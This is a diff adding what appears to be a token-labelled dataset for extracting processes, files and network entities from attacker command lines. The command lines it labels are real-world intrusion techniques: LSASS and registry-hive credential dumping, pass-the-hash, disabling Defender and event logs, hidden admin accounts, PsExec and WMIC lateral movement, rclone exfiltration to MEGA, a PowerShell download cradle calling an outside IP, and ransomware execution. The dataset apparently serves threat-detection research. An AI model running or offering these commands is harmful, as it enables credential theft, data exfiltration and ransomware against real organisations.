@@ -1,0 +1,10484 @@
+C:\Windows\system32\cmd.exe B-Process
+/c O
+cd O
+%appdata%\Microsoft B-File
+&& O
+mkdir O
+Network B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/c O
+cd O
+%appdata%\Microsoft\Network B-File
+&& O
+powershell B-Process
+Expand-Archive O
+python-3.10.4-embed-amd64.zip B-File
+-DestinationPath O
+%appdata%\Microsoft\Network B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/c O
+attrib B-Process
++S O
++H O
+%appdata%\Microsoft\Network B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/c O
+attrib B-Process
++S O
++H O
+%appdata%\Microsoft\Network\python-3.10.4-embed-amd64.zip B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/c O
+attrib B-Process
++S O
++H O
+%appdata%\Microsoft\Network\Packages.txt B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/c O
+cd O
+%appdata%\Microsoft\Network B-File
+&& O
+python.exe B-Process
+Packages.txt B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/c O
+cd O
+%appdata%\Microsoft\Network B-File
+&& O
+powershell B-Process
+-Command O
+start O
+script.bat B-File
+-Verb O
+RunAs O
+
+c:\windows\system32\schtasks.exe B-Process
+/run O
+/tn O
+microsoft\windows\wininet\cachetask B-File
+
+c:\windows\system32\reg.exe B-Process
+add O
+hklm\software\microsoft\windows B-File
+nt\currentversion\image I-File
+file I-File
+execution I-File
+options\taskmgr.exe I-File
+/v O
+debugger O
+/t O
+reg_sz O
+/d O
+c:\system B-File
+
+c:\windows\system32\wevtutil.exe B-Process
+set-log O
+microsoft-windows-taskscheduler/operational B-File
+/enabled:false O
+
+c:\windows\system\procdump.exe B-Process
+-accepteula O
+-ma O
+lsass.exe B-Process
+lsass.dmp B-File
+
+c:\windows\system\dumpert.exe B-Process
+lsass.exe B-Process
+
+powershell B-Process
+rundll32.exe B-Process
+c:\windows\system32\comsvcs.dll, B-File
+minidump O
+(get-process O
+lsass).id B-Process
+c:\temp\lsass.dmp B-File
+full O
+
+c:\windows\system32\windowspowershell\v1.0\powershell.exe B-Process
+-exec O
+bypass O
+.\adrecon.ps1 B-File
+
+c:\windows\system32\wevtutil.exe B-Process
+set-log O
+active B-File
+directory I-File
+web I-File
+services I-File
+/enabled:false O
+
+c:\windows\system32\wevtutil.exe B-Process
+set-log O
+hardwareevents B-File
+/enabled:false O
+
+c:\windows\system32\wevtutil.exe B-Process
+set-log O
+internet B-File
+explorer I-File
+/enabled:false O
+
+cmd.exe B-Process
+/q O
+/c O
+reg B-Process
+add O
+hkey_local_machine\system\currentcontrolset\control\lsa B-File
+/v O
+disablerestrictedadmin O
+/t O
+reg_dword O
+/d O
+0 O
+1> O
+\\127.0.0.1\admin\$\__<timestamp>\.<num> B-File
+2>&1 O
+
+cmd.exe B-Process
+/q O
+/c O
+#upload O
+c:\users\<user>\documents\<doc> B-File
+/home/kali/desktop/<doc> B-File
+1> O
+\\127.0.0.1\admin$\<num>.<num> B-File
+2>&1 O
+
+cmd.exe B-Process
+/q O
+/c O
+#download O
+c:\users\<user>\documents\<doc> B-File
+/home/kali/desktop/<doc> B-File
+1> O
+\\127.0.0.1\admin$\<num>.<num> B-File
+2>&1 O
+
+c:\windows\system32\windowspowershell\v1.0\powershell.exe B-Process
+-exec O
+bypass O
+.\apply.ps1 B-File
+
+cmd.exe B-Process
+/c O
+\\<domaincontroller>\netlogon\def.vbs B-File
+
+cmd.exe B-Process
+-c O
+\\<domain B-File
+controller>\netlogon\<num>.exe I-File
+--access-token O
+<token> O
+
+cmd.exe B-Process
+-c O
+\\<domain B-File
+controller>\netlogon\<num>.exe I-File
+
+<num>.exe B-Process
+-access-token O
+<token> O
+-v O
+-p O
+\\<hostname>\scans B-File
+
+c:\windows\system32\cmd.exe B-Process
+/c O
+fsutil B-Process
+behavior O
+set O
+symlinkevaluation B-File
+r2l:1 O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+net B-Process
+time O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+ping B-Process
+[Domain B-Socket
+Controller] I-Socket
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+nltest B-Process
+/dclist:[Domain B-Socket
+Name] I-Socket
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+Net B-Process
+group O
+"Domain B-File
+Admins" I-File
+/domain O
+\ O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+nslookup B-Process
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+ping B-Process
+190.114.254.116 B-Socket
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+net B-Process
+group O
+/domain O
+
+cmd.exe B-Process
+/c O
+C:ProgramDataAnyDesk.exe B-Process
+–install O
+C:ProgramDataAnyDesk B-File
+–start-with-win O
+–silent O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+cool.exe B-Process
+[DC B-Socket
+IP I-Socket
+ADDRESS] I-Socket
+[DOMAIN O
+NAME] O
+Administrator O
+-c O
+"taskkill B-Process
+/f O
+/im O
+explorer.exe" B-Process
+
+"schtasks.exe" B-Process
+/Create O
+/RU O
+"NT O
+AUTHORITY\SYSTEM" O
+/tn O
+juqpxmakfk O
+/tr O
+"regsvr32.exe B-Process
+-s O
+\"C:\Users\REDACTED\ocrafh.html\"" B-File
+/SC O
+ONCE O
+/Z O
+/ST O
+14:20 O
+/ET O
+14:32 O
+
+ls.exe B-Process
+all O
+-oN O
+-output O
+C:\Users\REDACTED B-File
+
+procdump64.exe B-Process
+-accepteula O
+-ma O
+lsass.exe B-Process
+C:\ProgramData\lsass.dmp B-File
+
+C:\Windows\System32\cmd.exe B-Process
+/c O
+rundll32.exe B-Process
+C:\ProgramData\x86.dll, B-File
+StartA O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+copy O
+\\<REMOTE_WORKSTATION>\C$\ProgramData\lsass.dmp B-Socket
+c:\programdata\lsass.dmp B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+7za.exe B-Process
+a O
+-tzip O
+-mx5 O
+c:\programdata\lsass.zip B-File
+c:\programdata\lsass.dmp B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+7za.exe B-Process
+a O
+-tzip O
+-mx5 O
+c:\programdata\lsass.dmp B-File
+c:\programdata\lsass.zip B-File
+
+rclone.exe B-Process
+copy O
+\\REDACTED\Shares B-Socket
+mega:Shares B-Socket
+-q O
+--ignore-existing O
+--auto-confirm O
+--multi-thread-streams O
+4 O
+--transfers O
+4 O
+
+rclone.exe B-Process
+copy O
+"\\SERVER.domain.name\path" B-Socket
+mega:1 O
+-q O
+--ignore-existing O
+--auto-confirm O
+--multi-thread-streams O
+6 O
+--transfers O
+6 O
+
+rclone.exe B-Process
+"\\SERVER.domain.name\path" B-Socket
+mega:1 O
+-q O
+--ignore-existing O
+--auto-confirm O
+--multi-thread-streams O
+6 O
+--transfers O
+6 O
+
+psexec.exe B-Process
+\\<IP B-Socket
+ADDRESS> I-Socket
+-u O
+<DOMAIN>\Administrator O
+-p O
+"<PASSWORD>" O
+-s O
+-d O
+-h O
+-r O
+mstdc O
+-accepteula O
+-nobanner O
+c:\windows\temp\ttsel.exe B-File
+
+wmic B-Process
+/node:"<IP O
+ADDRESS>" O
+/user:"<DOMAIN>\Administrator" O
+/password:"<PASSWORD>" O
+process O
+call O
+create O
+"cmd.exe B-Process
+/c O
+c:\windows\temp\ttsel.exe" B-File
+
+rundll32.exe B-Process
+locker.dll B-File
+,run O
+/TARGET=\\HOST1.DOMAIN.NAME\C$ B-Socket
+
+ping B-Process
+-n O
+1 O
+<REDACTED>shell B-Socket
+wmic B-Process
+/node:<REDACTED> B-Socket
+process O
+get O
+executablepath O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+for O
+/f O
+%i O
+in O
+(C:\ProgramData\servers_live.txt) B-File
+do O
+net B-Process
+view O
+\\%i O
+/all O
+>> O
+C:\ProgramData\servers_live_netview.txt B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+for O
+/f O
+%%i O
+in O
+(C:\ProgramData\servers_live.txt) B-File
+do O
+dir B-Process
+\\%%i\C$ B-Socket
+>> O
+C:\ProgramData\servers_live_dir.txt B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+for O
+/f O
+%i O
+in O
+(C:\ProgramData\hosts.txt) B-File
+do O
+ping B-Process
+-n O
+1 O
+%i B-Socket
+-v O
+4 O
+| O
+find B-Process
+/I O
+"TTL" O
+>> O
+C:\ProgramData\hosts_live.txt B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+for O
+/f O
+%i O
+in O
+(C:\ProgramData\servers.txt) B-File
+do O
+ping B-Process
+-n O
+1 O
+%i B-Socket
+-v O
+4 O
+| O
+find B-Process
+/I O
+"TTL" O
+>> O
+C:\ProgramData\servers_live.txt B-File
+
+cmd B-Process
+/C O
+> O
+C:\ProgramData\1.txt B-File
+2>&1 O
+reg B-Process
+query O
+HKEY_USERS\\<SID>\Network B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+wmic B-Process
+/node:<REDACTED> B-Socket
+process O
+call O
+create O
+"cmd B-Process
+/C O
+> O
+C:\ProgramData\1.txt B-File
+2>&1 O
+reg B-Process
+query O
+HKEY_USERS\<SID>\Network" B-File
+
+cmd.exe B-Process
+/C O
+powershell B-Process
+Get-MpComputerStatus O
+> O
+C:\Windows\Temp\KMzFGwGn.tmp B-File
+2>&1 O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+AdFind.exe B-Process
+-f O
+"&(objectcategory=computer)" O
+operatingSystem O
+-csv O
+> O
+1.csv B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+AdFind.exe B-Process
+-f O
+"objectcategory=person" O
+sAMAccountName O
+name O
+displayName O
+givenName O
+department O
+description O
+title O
+mail O
+logonCount O
+-csv O
+> O
+person.csv B-File
+
+tasklist B-Process
+/S O
+<IP B-Socket
+of I-Socket
+remote I-Socket
+host> I-Socket
+
+cmd.exe B-Process
+/C O
+wmic B-Process
+/node:<remote B-Socket
+host> I-Socket
+process O
+get O
+executablepath O
+
+adfind.exe B-Process
+-f O
+"(objectcategory=person)" O
+> O
+ad_users.txt B-File
+
+adfind.exe B-Process
+-f O
+"(objectcategory=computer)" O
+> O
+ad_computers.txt B-File
+
+adfind.exe B-Process
+-sc O
+trustdmp B-File
+> O
+trustdmp.txt B-File
+
+adfind.exe B-Process
+-subnets O
+-f O
+"(objectCategory=subnet)" O
+> O
+subnets.txt B-File
+
+adfind.exe B-Process
+-gcb O
+-sc O
+trustdmp B-File
+> O
+trustdmp.txt B-File
+
+adfind.exe B-Process
+-sc O
+domainlist O
+> O
+domainlist.txt B-File
+
+adfind.exe B-Process
+-sc O
+dcmodes O
+> O
+dcmodes.txt B-File
+
+adfind.exe B-Process
+-sc O
+adinfo O
+> O
+adinfo.txt B-File
+
+adfind.exe B-Process
+-sc O
+dclist O
+> O
+dclist.txt B-File
+
+adfind.exe B-Process
+-sc O
+computers_pwdnotreqd O
+> O
+computers_pwdnotreqd.txt B-File
+
+attrib B-Process
++h O
+svshost.exe B-File
+
+attrib B-Process
++h O
+XMRig O
+CPU O
+mine.exe B-File
+
+attrib B-Process
++h O
+config.json B-File
+
+attrib B-Process
++h O
+HideAll.bat B-File
+
+attrib B-Process
++h O
+xmrig-notls.exe B-File
+
+zero.exe B-Process
+[TARGET_DC_NETBIOS_NAME] B-Socket
+[TARGET_DC_MACHINE_ACCOUNT$] B-Socket
+administrator O
+-c O
+"whoami" O
+
+reg B-Process
+query O
+"HKLM\System\CurrentControlSet\Control\Terminal B-File
+Server\WinStations\RDP-Tcp" I-File
+/v O
+PortNumber O
+
+reg B-Process
+add O
+"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal B-File
+Server" I-File
+/v O
+fDenyTSConnections O
+/t O
+REG_DWORD O
+/d O
+0 O
+
+netsh B-Process
+advfirewall O
+firewall O
+set O
+rule O
+group="remote B-Socket
+desktop" I-Socket
+new O
+enable=yes O
+
+netsh B-Process
+advfirewall O
+firewall O
+add O
+rule O
+name="allow O
+RDP" O
+dir=in O
+protocol=TCP O
+localport=3389 B-Socket
+action=allow O
+
+C:\Windows\system32\cmd.exe B-Process
+secretsdump.exe B-Process
+-hashes O
+:[HASH O
+REDACTED] O
+[USERNAME B-Socket
+REDACTED]@[IP I-Socket
+ADDRESS I-Socket
+REDACTED] I-Socket
+
+C:\Windows\system32\cmd.exe B-Process
+wmiexec.exe B-Process
+:NTLM_HASH B-Socket
+domain_admind@dc_ip I-Socket
+
+%WINDIR%\system32\NOTEPAD.EXE B-Process
+C:\Decryption_INFO.txt B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+C:\Windows\Temp\adf\anchorAsjuster_x64.exe B-Process
+--source=anchorDNS_x64.exe B-File
+--target=anchor_x64.exe B-File
+--domain=xyskencevli.com,sluaknhbsoe.com B-Socket
+--period=2 O
+--lasthope=2 O
+-guid O
+
+reg B-Process
+query O
+hklm\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall B-File
+/v O
+"DisplayName" O
+/s O
+
+reg B-Process
+query O
+hklm\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall B-File
+/v O
+"DisplayName" O
+/s O
+
+reg B-Process
+query O
+hkcu\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall B-File
+/v O
+"DisplayName" O
+/s O
+
+reg B-Process
+query O
+hkcu\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall B-File
+/v O
+"DisplayName" O
+
+net B-Process
+group O
+"enterprise B-File
+admins" I-File
+/domain O
+
+net B-Process
+group O
+"domain B-File
+admins" I-File
+/domainsysteminfo O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+ping B-Process
+HOSTX B-Socket
+
+C:\Windows\system32\cmd.exe B-Process
+/c O
+""C:\info\start.bat"" B-File
+
+cmd.exe B-Process
+/c O
+echo B-Process
+a3fed5b3a32 O
+> O
+\\.\pipe\3406c2 B-Socket
+
+cmd.exe B-Process
+/c O
+nltest B-Process
+/domain_trusts O
+/all_trusts O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+net B-Process
+group O
+"enterprise B-File
+admins" I-File
+/domain O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+net B-Process
+group O
+"domain B-File
+admins" I-File
+/domain O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+systeminfo B-Process
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+ping B-Process
+HOST B-Socket
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+nltest B-Process
+/domain_trusts O
+/all_trusts O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+time O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+C:\Windows\Temp\adf\adf.bat B-File
+
+adfind.exe B-Process
+-f O
+"objectcategory=computer" O
+
+adfind.exe B-Process
+-sc O
+trustdmp B-File
+
+adfind.exe B-Process
+-subnets O
+-f O
+(objectCategory=subnet) O
+
+adfind.exe B-Process
+-f O
+"(objectcategory=group)" O
+
+adfind.exe B-Process
+-gcb O
+-sc O
+trustdmp B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/c O
+""C:\Users\USER\Desktop\info\start.bat"" B-File
+
+nltest B-Process
+/dclist:<hidden>.local B-Socket
+
+net B-Process
+localgroup O
+Administrators B-File
+
+adfind.exe B-Process
+-f O
+"(objectcategory=organizationalUnit)" O
+
+start O
+PsExec.exe B-Process
+-accepteula O
+@C:\share$\comps1.txt B-File
+-u O
+"domain\User" O
+-p O
+"$PASSWORD" O
+cmd B-Process
+/c O
+COPY O
+"\\DOMAINCONTROLLER\share$\fQumH.exe" B-File
+"C:\windows\temp\"" B-File
+
+start O
+PsExec.exe B-Process
+-accepteula O
+-d O
+@C:\share$\comps5.txt B-File
+-u O
+"domain\User" O
+-p O
+"$PASSWORD" O
+cmd B-Process
+/c O
+"C:\windows\temp\fQumH.exe" B-File
+
+net B-Process
+user O
+sqlbackup B-Process
+qc69t4b#z0ke3 O
+/add O
+
+net B-Process
+user O
+localadmin O
+qc69t4b#z0ke3 O
+/add O
+
+net B-Process
+localgroup O
+administrators B-File
+localadmin O
+/add O
+
+ntdsAudit.exe B-Process
+ntds.dit B-File
+-s O
+SYSTEM O
+-p O
+pwddump.txt B-File
+-u O
+users.csv B-File
+
+net B-Process
+localgroup O
+"administrator" B-File
+
+net B-Process
+group O
+"domain B-File
+admins" I-File
+/dom O
+
+ping B-Process
+-n O
+1 O
+hostname B-Socket
+>> O
+C:\programdata\log.txt B-File
+
+ping B-Process
+-n O
+1 O
+hostname2 B-Socket
+>> O
+C:\programdata\log.txt B-File
+
+ping B-Process
+-n O
+1 O
+hostname3 B-Socket
+>> O
+C:\programdata\log.txt B-File
+
+C:\Windows\system32\net1 B-Process
+group O
+"domain B-File
+admins" I-File
+/dom O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+ping B-Process
+DOMAINCONTROLLER B-Socket
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+ping B-Process
+ENDPOINT B-Socket
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+net B-Process
+localgroup O
+Administrators B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/c O
+"C:\\Users\\info\\start.bat" B-File
+
+powershell.exe B-Process
+-executionpolicy O
+remotesigned O
+-File O
+.\Get-DataInfo.ps1 B-File
+method O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+wmic B-Process
+/node:"DOMAINCONTROLLER" B-Socket
+process O
+call O
+create O
+"C:\3.exe" B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+wmic B-Process
+/node:"ENDPOINT" B-Socket
+process O
+call O
+create O
+"C:\test.exe" B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+nltest B-Process
+/dclist O
+<domainname B-Socket
+redacted> I-Socket
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+ping B-Process
+<hostname B-Socket
+redacted> I-Socket
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+All O
+windows O
+Import-Module O
+ActiveDirectory O
+Get-ADComputer O
+-Filter O
+{enabled O
+-eq O
+$true} O
+-properties O
+*|select O
+Name, O
+DNSHostName, O
+OperatingSystem, O
+LastLogonDate, O
+IPv4Address O
+| O
+Export-CSV O
+C:\Users\AllWindows.csv B-File
+-NoTypeInformation O
+-Encoding O
+UTF8 O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+route B-Process
+print O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+ping B-Process
+http://<IP B-Socket
+redacted>/ I-Socket
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+ping B-Process
+http://<IP B-Socket
+redacted> I-Socket
+
+C:\Windows\system32\mmc.exe B-Process
+C:\Windows\system32\dsa.msc B-File
+
+C:\Windows\system32\mmc.exe B-Process
+C:\Windows\System32\gpedit.msc B-File
+
+C:\Windows\System32\cmd.exe B-Process
+/c O
+start O
+rundll32 B-Process
+namr.dll,IternalJob B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+powershell.exe B-Process
+-nop O
+-w O
+hidden O
+-c O
+"IEX B-Socket
+((new-object I-Socket
+net.webclient).downloadstring('http://104.243.33.50:80/a'))" I-Socket
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+powershell.exe B-Process
+-nop O
+-w O
+hidden O
+-c O
+"IEX B-Socket
+((new-object I-Socket
+net.webclient).downloadstring(' I-Socket
+http://104.243.33.50:80/a I-Socket
+'))" I-Socket
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+getsystem B-Process
+
+cmd.exe B-Process
+/C O
+rundll32.exe B-Process
+C:\windows\System32\comsvcs.dll, B-File
+MiniDump O
+968 O
+C:\ProgramData\REDACTED\lsass.dmp B-File
+full O
+
+C:\programdata\procdump64.exe B-Process
+-accepteula O
+-ma O
+lsass.exe B-Process
+C:\ProgramData\lsass.dmp B-File
+
+tasklist B-Process
+/v O
+/s O
+<REMOTE_IP> B-Socket
+
+net B-Process
+group O
+"Domain computers" B-Socket
+/dom O
+
+ping B-Process
+-n O
+1 O
+<REMOTE_IP> B-Socket
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+shell O
+whoami O
+/all O
+
+Seatbelt.exe B-Process
+-group=all O
+-outputfile= O
+"C:\ProgramData\seatinfo.txt" B-File
+
+%windir%\system32\cmd.exe B-Process
+/c O
+start O
+rundll32.exe B-Process
+mkl2n.dll,kXlNkCKgFC B-File
+
+cmd.exe B-Process
+/c O
+echo B-Process
+wafrms O
+> O
+\\.\pipe\wafrms B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/c O
+echo B-Process
+dec8f35bcbf O
+> O
+\\.\pipe\7fd13a B-Socket
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+reg.exe B-Process
+save O
+hklm\sam O
+c:\ProgramData\sam.hive B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+reg.exe B-Process
+save O
+hklm\security O
+c:\ProgramData\security.save B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+reg.exe B-Process
+save O
+hklm\system O
+c:\ProgramData\system.save B-File
+
+af.exe B-Process
+-f O
+"(objectcategory=person)" O
+> O
+ad_users.txt B-File
+
+af.exe B-Process
+-f O
+"objectcategory=computer" O
+> O
+ad_computers.txt B-File
+
+cmd.exe B-Process
+/c O
+rundll32.exe B-Process
+C:\ProgramData\n23.dll,AddProgram B-File
+
+C:\Windows\System32\rundll32.exe B-Process
+tamirlan.dll,EdHVntqdWt B-File
+
+net B-Process
+user O
+sql_admin O
+P@ssw0rd! O
+/add O
+
+net B-Process
+localgroup O
+Administrators B-File
+sql_admin O
+/ADD O
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+ping B-Process
+-n O
+1 O
+<REDACTED_DOMAIN_NAME> B-Socket
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+tasklist B-Process
+/v O
+/s O
+<REDACTED_IP> B-Socket
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+af.exe B-Process
+-f O
+"(objectcategory=person)" O
+> O
+ad_users.txt B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+af.exe B-Process
+-f O
+"objectcategory=computer" O
+> O
+ad_computers.txt B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+af.exe B-Process
+-f O
+"(objectcategory=organizationalUnit)" O
+> O
+ad_ous.txt B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+af.exe B-Process
+-sc O
+trustdmp B-File
+> O
+trustdmp.txt B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+af.exe B-Process
+-subnets O
+-f O
+(objectCategory=subnet) O
+> O
+subnets.txt B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+af.exe B-Process
+-f O
+"(objectcategory=group)" O
+> O
+ad_group.txt B-File
+
+C:\Windows\system32\cmd.exe B-Process
+/C O
+af.exe B-Process
+-gcb O
+-sc O
+trustdmp B-File
+> O
+trustdmp.txt B-File
+
+net B-Process
+localgroup O
+Administrators B-File
+Support O
+/add O
+& O
+net B-Process
+localgroup O
+"Remote B-File
+Desktop I-File
+Users" I-File
+Support O
+/add O
+
+reg B-Process
+add O
+"HKLM\SOFTWARE\Microsoft\Windows B-File
+NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" I-File
+/t O
+REG_DWORD O
+/f O
+/d O
+0 O
+/v O
+Support O
+
+taskkill B-Process
+/F O
+/IM O
+MSASCuiL.exe B-Process
+
+REG B-Process
+ADD O
+"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" B-File
+/v O
+"HideSCAHealth" O
+/t O
+REG_DWORD O
+/d O
+0x1 O
+/f O
+
+REG B-Process
+DELETE O
+"HKLM\Software\Microsoft\Windows\CurrentVersion\Run" B-File
+/v O
+"SecurityHealth" O
+/f O
+
+REG B-Process
+ADD O
+"HKLM\SOFTWARE\Policies\Microsoft\Windows B-File
+Defender" I-File
+/v O
+"DisableAntiSpyware" O
+/t O
+REG_DWORD O
+/d O
+0x1 O
+/f O
+
+REG B-Process
+ADD O
+"HKLM\SOFTWARE\Policies\Microsoft\Windows B-File
+Defender" I-File
+/v O
+"DisableAntiSpyware" O
+/t O
+REG_DWORD O
+/d O
+0x1 O
+/f O
+
+REG B-Process
+ADD O
+"HKLM\SOFTWARE\Policies\Microsoft\Windows B-File
+Defender" I-File
+/v O
+"AllowFastServiceStartup" O
+/t O
+REG_DWORD O
+/d O
+0x0 O
+/f O
+
+REG B-Process
+ADD O
+"HKLM\SOFTWARE\Policies\Microsoft\Windows B-File
+Defender" I-File
+/v O
+"ServiceKeepAlive" O
+/t O
+REG_DWORD O
+/d O
+0x0 O
+/f O
+
+REG B-Process
+ADD O
+"HKLM\SOFTWARE\Policies\Microsoft\Windows B-File
+Defender\Real-Time I-File
+Protection" I-File
+/v O
+"DisableIOAVProtection" O
+/t O
+REG_DWORD O
+/d O
+0x1 O
+/f O
+
+REG B-Process
+ADD O
+"HKLM\SOFTWARE\Policies\Microsoft\Windows B-File
+Defender\Real-Time Protection" I-File
+/v O
+"DisableRealtimeMonitoring" O
+/t O
+REG_DWORD O
+/d O
+0x1 O
+/f O
+
+REG B-Process
+ADD O
+"HKLM\SOFTWARE\Policies\Microsoft\Windows B-File
+Defender\Spynet" I-File
+/v O
+"DisableBlockAtFirstSeen" O
+/t O
+REG_DWORD O
+/d O
+0x1 O
+/f O
+
+REG B-Process
+ADD O
+"HKLM\SOFTWARE\Policies\Microsoft\Windows B-File
+Defender\Spynet" I-File
+/v O
+"LocalSettingOverrideSpynetReporting" O
+/t O
+REG_DWORD O
+/d O
+0x0 O
+/f O
+
+REG B-Process
+ADD O
+"HKLM\SOFTWARE\Policies\Microsoft\Windows B-File
+Defender\Spynet" I-File
+/v O
+"SubmitSamplesConsent" O
+/t O
+REG_DWORD O
+/d O
+0x2 O
+/f O
+
+REG B-Process
+ADD O
+"HKLM\SOFTWARE\Policies\Microsoft\Windows B-File
+Defender\UX I-File
+Configuration" I-File
+/v O
+"NotificationSuppress" O
+/t O
+REG_DWORD O
+/d O
+0x1 O
+/f O
+
+"C:\Windows\system32\net.exe" B-Process
+group O
+/domain O
+
+"C:\Windows\system32\net.exe" B-Process
+group O
+"domain B-File
+admins" I-File
+/domain O
+
+netsh B-Process
+advfirewall O
+firewall O
+add O
+rule O
+name="rdp" O
+dir=in O
+protocol=tcp O
+localport=3389 B-Socket
+action=allow O
+
+netsh B-Process
+advfirewall O
+firewall O
+set O
+rule O
+group="windows B-File
+management I-File
+instrumentation I-File
+(wmi)" I-File
+new O
+enable=yes O
+
+reg B-Process
+add O
+"HKLM\SYSTEM\CurrentControlSet\Control\Terminal B-File
+Server" I-File
+/v O
+fDenyTSConnections O
+/t O
+REG_DWORD O
+/d O
+0 O
+/f O
+
+cmd B-Process
+/c O
+"C:\Users\Administrator\Music\start B-File
+— I-File
+копия.bat" I-File
+
+rclone.exe B-Process
+copy O
+"\\[FILE B-File
+SERVER]\human I-File
+resources" I-File
+MEGA:domain O
+-q O
+--ignore-existing O
+--auto-confirm O
+--multi-thread-streams O
+12 O
+--transfers O
+12 O
+
+rclone.exe B-Process
+copy O
+"\\[FILE B-File
+SERVER]\Files" I-File
+MEGA:domain O
+-q O
+--ignore-existing O
+--auto-confirm O
+--multi-thread-streams O
+12 O
+--transfers O
+12 O
+
+schtasks B-Process
+/create O
+/ru O
+SYSTEM O
+/sc O
+ONSTART O
+/tn O
+Update2 O
+/tr O
+"cmd B-Process
+/c O
+rundll32 B-Process
+%PUBLIC%\music\svcmc.dll, B-File
+MainFunc" I-File
+schtasks B-Process
+/run O
+/TN O
+Update2 O
+
+"%PUBLIC%\Music\rclone.exe"	B-Process
+copy	O
+E:\REDACTED\customers	B-File
+ftp1:REDACTED/customers	B-Socket
+-q	O
+--ignore-existing	O
+--REDACTED-confirm	O
+--multi-thread-streams	O
+12	O
+--transfers	O
+12	O
+--no-console	O
+
+%WINDIR%\system32\cmd.exe	B-Process
+/C	O
+.\rclone.exe	B-Process
+copy	O
+"E:\REDACTED\domain"	B-File
+mega:REDACTED/domain	B-Socket
+-q	O
+--ignore-existing	O
+--REDACTED-confirm	O
+--multi-thread-streams	O
+12	O
+--transfers	O
+12	O
+--no-console	O
+
+%WINDIR%\system32\cmd.exe	B-Process
+/c	O
+""%PUBLIC%\Music\WMI.bat"	B-File
+
+%PUBLIC%\Music\SETUP.bat	B-File
+%PUBLIC%\Music\COPY.bat	B-File
+
+%PUBLIC%\Music\ds.exe"	B-Process
+%PUBLIC%\Music\DEF.bat	B-File
+
+cmd.exe	B-Process
+/c	O
+bitsadmin	O
+/transfer	O
+update_service	O
+\\REDACTED\share$\ds.exe	B-File
+%APPDATA%\ds.exe	B-File
+&	O
+%APPDATA%\ds.exe	B-Process
+-pass	O
+REDACTED	O
+
+PsExec.exe	B-Process
+/accepteula	O
+@comps1.txt	B-File
+-u	O
+"domain.local\Administrator"	O
+-p	O
+"REDACTED"	O
+cmd	B-Process
+/c	O
+COPY	O
+"\\REDACTED\share$\ds.exe"	B-File
+"%WINDIR%\temp"	B-File
+
+PsExec.exe	B-Process
+/accepteula	O
+@comps1.txt	B-File
+-u	O
+"domain.local\Administrator"	O
+-p	O
+"REDACTED"	O
+cmd	B-Process
+/c	O
+COPY	O
+"\\REDACTED\share$\ds.exe"	B-File
+%WINDIR%\temp	B-File
+
+%WINDIR%\system32\cmd.exe	B-Process
+/c	O
+""%PUBLIC%\Music\share$\COPY.bat"	B-File
+
